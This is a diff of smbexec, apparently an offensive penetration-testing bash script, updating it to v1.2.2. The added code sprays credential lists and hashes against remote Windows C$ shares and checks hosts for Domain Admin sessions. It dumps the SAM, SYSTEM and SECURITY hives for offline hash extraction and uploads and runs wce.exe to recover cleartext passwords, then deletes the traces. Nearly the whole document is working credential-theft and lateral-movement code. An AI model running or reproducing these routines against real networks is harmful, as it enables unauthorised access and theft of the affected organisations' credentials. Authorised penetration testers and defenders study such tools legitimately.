@@ -7,7 +7,7 @@
 # Script super-dopified by @al14s - Thanks for taking it to the next level!!
 #
 #Rapid psexec style attack using linux samba tools
-#Copyright (C) 2012  Eric Milam (Brav0Hax) & Martin Bos (Purehate)
+#Copyright (C) 2013 Eric Milam (Brav0Hax) & Martin Bos (Purehate)
 #
 #This program is free software: you can redistribute it and/or modify
 #it under the terms of the GNU General Public License as published by
@@ -22,7 +22,7 @@
 #You should have received a copy of the GNU General Public License
 #along with this program.  If not, see <http://www.gnu.org/licenses/>.e
 #
-# Last update - 11/20/2012 v1.2.0
+# Last update - 01/16/2013 v1.2.2
 #############################################################################################
 
 # Check to see if X is running
@@ -66,6 +66,9 @@ if [ ! -e /usr/local/samba/lib/smb.conf ]; then
 	mkdir -p /usr/local/samba/lib/
 	cp $smbexecpath/patches/smb.conf /usr/local/samba/lib/smb.conf
 fi
+
+# See if wce exists in the progs folder
+if [ -e $smbexecpath/wce.exe ]; then wce=1; fi
 
 f_ragequit(){ 
 echo -e "\n\n\e[1;31m[-] Rage-quitting....\e[0m"
@@ -289,14 +292,149 @@ f_vanish(){
 f_banner(){
 	clear
 	echo "************************************************************"
-	echo -e "		      \e[1;36msmbexec - v1.2.0\e[0m       "
+	echo -e "		      \e[1;36msmbexec - v1.2.2\e[0m       "
 	echo "	A rapid psexec style attack with samba tools              "
 	echo "      Original Concept and Script by Brav0Hax & Purehate    "
-	echo "              Codename - Himalayan Salt Room	          "
+	echo "              Codename - Mommy's Little Monster	          "
 	echo -e "             Gonna pha-q up - \e[1;35mPurpleTeam\e[0m \e[1;37mSmash!\e[0m"
 	echo "************************************************************"
 	echo
 }
+
+
+#Function to verify logins can actually login into systems via RDP
+#Metasploit smb_login only verifies login is valid not if they can login to systems remotely
+f_smb_login(){
+f_banner	
+f_get_user_list
+f_parse_user_list
+f_get_target_list
+f_verify_credentials
+sleep 5
+f_freshstart
+f_mainmenu
+}
+
+f_get_user_list(){
+    user_list=
+    read -e -p " Please provide the path to your credential list: " user_list
+    if [ ! -e $user_list ]; then
+	    echo -en "   The file does not exist.\n"
+	    user_list=
+    fi
+}
+
+f_parse_user_list(){
+#Credential file should be TAB separate. Below TABs are converted to '%' which is what smbclient needs as a separator
+		sed -e 's:\t:%:g' $user_list > /tmp/smbexec/credentials.lst
+}
+
+f_get_target_list(){
+
+    if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"; fi
+    read -e -p " Target IP or host list $p: " tf
+    if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi
+
+    if [[ $tf =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+	    echo $tf > /tmp/smbexec/rhost.txt
+	    RHOSTS=/tmp/smbexec/rhost.txt
+    elif [[ -e $tf ]]; then 
+	    RHOSTS=$tf
+    else
+	    echo -en "   Invalid IP or file does not exist.\n"
+	    sleep 3
+	    f_get_target_list
+    fi	
+	read -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
+	if [ -z $SMBDomain ]; then SMBDomain=.;	fi
+}
+
+f_verify_credentials(){
+SMBHASH=
+password_hash=
+	
+	if [ -z "$check_for_da" ]; then
+		read -p " Do you want to include a check for DA/EA processes on the systems? [y/N] : " da_check
+		da_check=$(echo ${da_check} | tr 'A-Z' 'a-z')
+		if [ "$da_check" = "y" ]; then check_for_da=1; fi
+		echo
+	fi
+	for i in $(cat $RHOSTS); do
+	# Check to see if login is valid
+		for j in $(cat /tmp/smbexec/credentials.lst); do
+			unset SMBHASH
+			password_hash=$(echo $j|cut -d "%" -f2)
+			if [ "$(echo $password_hash| wc -m)" -ge "65" ]; then
+				export SMBHASH=$password_hash # This is required when using a hash value
+			fi
+			$smbexecpath/smbexeclient //$i/C$ -U $SMBDomain/$j -c showconnect &> /tmp/smbexec/credential.chk
+			f_successful_login
+		done
+	if [ -e /tmp/smbexec/$i.successful.logins.tmp ]; then
+		cat /tmp/smbexec/$i.successful.logins.tmp| cut -d " " -f9-10 > $logfldr/$i.successful.logins
+	fi
+	
+	if [ -e /tmp/smbexec/da-systems.lst ]; then
+		cat /tmp/smbexec/da-systems.lst|cut -d " " -f2-13 > $logfldr/systems-with-da.lst
+	fi
+	done
+
+}
+
+f_successful_login(){
+username=$(echo $j|cut -d "%" -f1)
+password=$(echo $j|cut -d "%" -f2)
+successful_login=$(cat /tmp/smbexec/credential.chk|grep "//$i")
+
+if [ -z "$successful_login" ]; then
+	if [ $mainchoice != "7" ]; then echo -e "\e[1;31m[-] Remote login failed to $i with credentials $username $password\e[0m"; fi
+else
+	if [ $mainchoice != "7" ]; then echo -e "\e[1;32m[+] Remote login successful to $i with credentials $username $password \e[0m" | tee -a /tmp/smbexec/$i.successful.logins.tmp; fi
+	if [ ! -z $check_for_da ]; then
+		f_get_domain_admin_users
+		f_get_logged_in_users
+		f_compare_accounts
+	fi
+fi
+
+}
+
+f_get_domain_admin_users(){
+if [ ! -e /tmp/smbexec/admins.tmp ]; then
+	$smbexecpath/smbwinexe -U $SMBDomain/$j //$i "CMD /C net group \"Domain Admins\" /domain && net group \"Enterprise Admins\" /domain" &> /tmp/smbexec/admins.tmp
+	cat /tmp/smbexec/admins.tmp |egrep -v '(Group name|Comment|Members|-----|successfully|HASH PASS|ERRDOS)'|sed -e 's/\s\+/\n/g'|sed '/^$/d'|sort -u> /tmp/smbexec/admins.lst
+fi
+}
+
+f_get_logged_in_users(){
+$smbexecpath/smbwinexe -U $SMBDomain/$j //$i "CMD /C tasklist /V /FO CSV" &> /tmp/smbexec/tasklist.tmp
+cat /tmp/smbexec/tasklist.tmp |cut -d '"' -f14|egrep -v '(NT AUTHORITY|User Name|HASH PASS|ERRDOS)'|cut -d "\\" -f2|sort -u > /tmp/smbexec/tasklist.sorted
+
+$smbexecpath/smbwinexe --uninstall -U $SMBDomain/$j //$i "CMD /C qwinsta" &> /tmp/smbexec/qwinsta.tmp
+cat /tmp/smbexec/qwinsta.tmp|sed -e 's/\s\+/,/g'|sed -e 's/>/,/g'|cut -d "," -f3|egrep -v '(USERNAME|65536|HASH PASS|ERRDOS)' > /tmp/smbexec/qwinsta.sorted
+sort -u /tmp/smbexec/tasklist.sorted /tmp/smbexec/qwinsta.sorted > /tmp/smbexec/loggedin.users
+}
+
+f_compare_accounts(){
+admins=
+users=
+
+for admins in $(cat /tmp/smbexec/admins.lst); do
+        for users in $(cat /tmp/smbexec/loggedin.users|grep -i $admins);do
+                if [ ! -z "$users" ]; then 
+                        echo -e "\t\e[1;32m[+] DA account $users is logged in or running a process on $i \e[0m"|tee -a /tmp/smbexec/da-systems.lst
+                fi
+        done
+done
+
+}
+
+f_da_sys_check(){
+check_for_da=1
+f_smb_login
+}
+
+
 
 #Function to grab local hashes and domain cached creds
 f_hashgrab(){
@@ -320,10 +458,11 @@ fi
 	    RHOSTS=$tf
     else
 	    echo -en "   Invalid IP or file does not exist.\n"
-	    f_insideprompt
+	    sleep 3
+	    f_hashgrab
     fi
 
-    for i in $(cat $RHOSTS); do
+for i in $(cat $RHOSTS); do
 	# Check to see if login is valid to the system before it attempts anything else
 	$smbexecpath/smbexeclient //$i/C$ -A /tmp/smbexec/smbexec.auth -c "showconnect" >& /tmp/smbexec/connects.tmp
 
@@ -331,7 +470,7 @@ fi
 	f_smbauthinfo
 
 	if [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
-		echo -e "\n\e[1;32m[+] Authentication to $i successful...\e[0m\n"
+		echo -e "\n\e[1;32m[+] Authentication to $i successful...\e[0m"
 	elif [ -s /tmp/smbexec/success.chk ] && [ ! -z "$badshare" ]; then
 		echo -e "\n\e[1;33m[*] Authentication to $i was successful, but the share doesn't exist\e[0m"
 	elif [ ! -z "$logonfail" ]; then
@@ -353,22 +492,35 @@ fi
 		echo $ConnCheck >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file
 		mkdir $logfldr/hashes/$i
 		# Get the registry keys
-		$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg.exe save HKLM\SAM C:\Windows\Temp\sam && reg.exe save HKLM\SECURITY C:\Windows\Temp\sec && reg.exe save HKLM\SYSTEM C:\Windows\Temp\sys" &> /dev/null
-		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\WINDOWS\\Temp\\sam $logfldr/hashes/$i/sam" &> /dev/null
-		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\WINDOWS\\Temp\\sec $logfldr/hashes/$i/sec" &> /dev/null
-		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\WINDOWS\\Temp\\sys $logfldr/hashes/$i/sys" &> /dev/null
-		#cleanup the host
-		$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL C:\Windows\Temp\sam && DEL C:\Windows\Temp\sec && DEL C:\Windows\Temp\sys" &> /dev/null
+		$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg.exe save HKLM\SAM %WINDIR%\Temp\sam && reg.exe save HKLM\SYSTEM %WINDIR%\Temp\sys && reg.exe save HKLM\SECURITY %WINDIR%\Temp\sec" &> /dev/null
+		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\%WINDIR%\\Temp\\sam $logfldr/hashes/$i/sam" &> /dev/null
+		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\%WINDIR%\\Temp\\sec $logfldr/hashes/$i/sec" &> /dev/null
+		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\%WINDIR%\\Temp\\sys $logfldr/hashes/$i/sys" &> /dev/null
 	
 		#Get the hashes out of the reg keys
-		if [ -e $logfldr/hashes/$i/sam ] && [ -e $logfldr/hashes/$i/sec ] && [ -e $logfldr/hashes/$i/sys ]; then
+		if [ -e $logfldr/hashes/$i/sam ] && [ -e $logfldr/hashes/$i/sys ]; then
 			$creddumpath/pwdump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sam > $logfldr/hashes/$i/localhashes.lst
-			$creddumpath/cachedump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sec > $logfldr/hashes/$i/dcchashes.lst
+			if [ -e $logfldr/hashes/$i/sec ]; then
+				$creddumpath/cachedump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sec > $logfldr/hashes/$i/dcchashes.lst
+			fi
 			echo -en "\t\e[1;32m[+] Hashes from $i have been dumped...\e[0m\n"
 			sleep 2
 		    else
 			echo -en "\t\e[1;31m[!] Something happened and I couldn't get the registry keys from $i...\e[0m\n"
 			sleep 2
+		fi
+		
+		#Get the clear text passwords with protected wce
+		if [ $wce == 1 ]; then
+			$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "put $smbexecpath/wce.exe \\%WINDIR%\\Temp\\wce.exe" &> /dev/null
+			$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C \\%WINDIR%\\Temp\\wce.exe -w" &> /tmp/smbexec/wce.tmp
+			#Put the passwords in a text file in the logfolder
+			cat /tmp/smbexec/wce.tmp|grep ":" > $logfldr/hashes/$i/cleartext.pwds
+			#cleanup the host including wce.exe
+			$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL %WINDIR%\Temp\sam && DEL %WINDIR%\Temp\sec && DEL %WINDIR%\Temp\sys && DEL %WINDIR%\Temp\wce.exe" &> /dev/null
+		else
+			#cleanup the host minus wce.exe
+			$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL %WINDIR%\Temp\sam && DEL %WINDIR%\Temp\sec && DEL %WINDIR%\Temp\sys" &> /dev/null
 		fi
 	fi
 
@@ -385,7 +537,6 @@ f_mainmenu
 }
 
 f_dchashgrab(){
-
 if [ ! -e "$logfldr"/hashes ]; then
 	mkdir $logfldr/hashes
 fi
@@ -394,18 +545,18 @@ f_banner
 f_smbauth
 f_finddcs
 
-read -e -p " Domain Controller IP address: " tf
+tf=
+while [ -z $tf ]; do
+	read -e -p " Domain Controller IP address: " tf
 
-if [[ $tf =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
-	echo $tf > /tmp/smbexec/rhost.txt
-	RHOSTS=/tmp/smbexec/rhost.txt
-elif [[ -e $tf ]]; then
-	RHOSTS=$tf
-else
-	echo -en "   Invalid IP or file does not exist.\n"
-	f_insideprompt
-fi
-
+	if [[ $tf =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+		echo $tf > /tmp/smbexec/rhost.txt
+		RHOSTS=/tmp/smbexec/rhost.txt
+	else
+		echo -en "   Invalid IP address...\n"
+		tf=
+	fi
+done
 f_ntdspath
 }
 
@@ -426,7 +577,7 @@ fi
 
 ntdssuccess=
 echo -e "\n\e[1;33m[*]Checking to see if the ntds.dit file exists in the provided path\e[0m"
-$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C IF EXIST $ntdsdrive$ntdspath\\ntds.dit ECHO Success" > /tmp/smbexec/ntds.chk
+$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C IF EXIST $ntdsdrive$ntdspath\\ntds.dit ECHO Success" &> /tmp/smbexec/ntds.chk
 ntdssuccess=$(cat /tmp/smbexec/ntds.chk|grep -o Success)
 
 if [ -z $ntdssuccess ]; then
@@ -458,7 +609,7 @@ fi
 
 tempsuccess=
 echo -e "\n\e[1;33m[*]Checking to see if the provided path exists\e[0m"
-$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C IF EXIST $tempdrive$temppath ECHO Success" > /tmp/smbexec/temppath.chk
+$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C IF EXIST $tempdrive$temppath ECHO Success" &> /tmp/smbexec/temppath.chk
 pathsuccess=$(cat /tmp/smbexec/temppath.chk|grep -o Success)
 
 if [ -z $pathsuccess ]; then
@@ -470,7 +621,7 @@ else
 fi
 
 echo -e "\e[1;33m[*]We have to make sure there is enough disk space available before we do the Shadow Copy\e[0m"
-$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C dir $ntdsdrive$ntdspath\\ntds.dit" > /tmp/smbexec/ntds.size
+$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C dir $ntdsdrive$ntdspath\\ntds.dit" &> /tmp/smbexec/ntds.size
 disksize=$(cat /tmp/smbexec/ntds.size |grep free|cut -d ')' -f2|cut -d "b" -f1|sed -e 's/^[ \t]*//'|sed -e 's/,//g')
 filesize=$(cat /tmp/smbexec/ntds.size |grep File|cut -d ')' -f2|cut -d "b" -f1|sed -e 's/^[ \t]*//'|sed 's/,//g')
 
@@ -534,12 +685,14 @@ f_mainmenu
 }
 
 f_finddcs(){
-dig SRV _ldap._tcp.pdc._msdcs.$SMBDomain.com |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > /tmp/smbexec/pdc.txt
-dig SRV _ldap._tcp.dc._msdcs.$SMBDomain.com |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > /tmp/smbexec/dcs.txt
-dig SRV _ldap._tcp.pdc._msdcs.$SMBDomain.net |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/pdc.txt
-dig SRV _ldap._tcp.dc._msdcs.$SMBDomain.net |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/dcs.txt
-dig SRV _ldap._tcp.pdc._msdcs.$SMBDomain.org |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/pdc.txt
-dig SRV _ldap._tcp.dc._msdcs.$SMBDomain.org |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/dcs.txt
+x="com net org"
+echo > /tmp/smbexec/pdc.txt
+echo > /tmp/smbexec/dcs.txt
+
+for i in $x; do
+	dig SRV _ldap._tcp.pdc._msdcs.$SMBDomain.$i |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/pdc.txt
+	dig SRV _ldap._tcp.dc._msdcs.$SMBDomain.$i |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/dcs.txt
+done
 
 if [ -s /tmp/smbexec/pdc.txt ]; then
 	echo -e "\nPrimary Domain Controller\n========================="
@@ -684,7 +837,6 @@ f_enumshares(){
 	f_mainmenu
 }
 
-
 f_smbauth(){
 	SMBUser= #Since the prog is a loop make sure we clear this out
 	while [ -z $SMBUser ]; do read -r -p " Please provide the username to authenticate as : " SMBUser; done
@@ -708,7 +860,7 @@ f_smbauth(){
 	elif [ "$mainchoice" == "4" ]; then # Check for domain for host share list option
 		read -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
 		if [ -z $SMBDomain ]; then SMBDomain=.;	fi
-	elif [ "$mainchoice" == "6" ]; then # Check for domain for host share list option
+	elif [ "$mainchoice" == "8" ]; then # Check for domain for host share list option
 		read -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
 		if [ -z $SMBDomain ]; then SMBDomain=.;	fi
 	else
@@ -789,7 +941,10 @@ f_getinfo(){
 	fi
 	f_getsome
 }
-
+f_sd(){
+xdg-open http://www.youtube.com/watch?v=D7sUh-DX7I0 >& /tmp/mlmjunk
+f_mainmenu
+}
 # The name says it all...get your popcorn ready...
 f_getsome(){
 	cat /dev/urandom| tr -dc '0-9a-zA-Z'|head -c 8 > /tmp/smbexec/filename.rnd #create a random filename
@@ -926,7 +1081,7 @@ f_freshstart(){
 rm -rf /tmp/smbexec/ # cleanup all the stuff we put in the temp dir
 
 # unset variables to prevent problems in the loop
-vars="badshare cemptyrpath ConnCheck connrefused enumber i isadmin lhost listener logonfail LPATH machine mainchoice oddshare onelettershare p paychoice payload port rcpath RHOSTS RPATH seed SHARERHOSTS SMBDomain SMBFilename SMBHash SMBPass SMBUser superoddshare tf unreachable datatable linktable"
+vars="badshare cemptyrpath ConnCheck connrefused enumber i isadmin lhost listener logonfail LPATH machine mainchoice oddshare onelettershare p paychoice payload port rcpath RHOSTS RPATH seed SHARERHOSTS SMBDomain SMBFilename SMBHash SMBPass SMBUser superoddshare tf unreachable datatable linktable check_for_da"
 
 for var in $vars; do
 	unset $var
@@ -964,8 +1119,10 @@ f_mainmenu(){
 	echo "3. Create a host list"
 	echo "4. Enumerate Shares"
 	echo "5. Create an executable and rc script"
-	echo "6. Hash grab"
-	echo "7. Exit"
+	echo "6. Remote Login Validation"
+	echo "7. Check systems for Domain Admin"
+	echo "8. Hash grab"
+	echo "9. Exit"
 
 	read -p "Choice : " mainchoice
 
@@ -975,9 +1132,12 @@ f_mainmenu(){
 		3) f_hosts;;
 		4) f_enumshares;;
 		5) f_vanish;;
-		6) f_hashmenu;;
-		7) if [[ -z $(ls $logfldr) ]];then rm -rf $logfldr; fi
+		6) f_smb_login;;
+		7) f_da_sys_check;;
+		8) f_hashmenu;;
+		9) if [[ -z $(ls $logfldr) ]];then rm -rf $logfldr; fi
 		   clear;f_freshstart;exit;;
+		1983) f_sd;;
 		*) f_mainmenu
 	esac
 }
